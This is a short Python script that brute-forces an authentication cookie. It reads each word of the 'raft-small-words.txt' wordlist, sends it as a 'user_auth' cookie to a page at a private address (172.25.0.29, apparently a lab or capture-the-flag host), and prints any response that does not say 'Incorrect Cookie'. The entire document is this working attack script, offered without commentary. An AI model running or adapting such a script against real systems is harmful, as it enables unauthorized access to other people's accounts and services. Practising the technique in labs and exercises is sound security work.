import requests
lines = []

with open("raft-small-words.txt","r") as raft:
	lines = raft.readlines()

for i in lines:
	mycookie = {'user_auth':i.replace("\n","")}
	response = requests.get('http://172.25.0.29/page1.php', cookies=mycookie)
	currentPageText = response.text
	if "Incorrect Cookie" not in currentPageText:
		print(response.text)


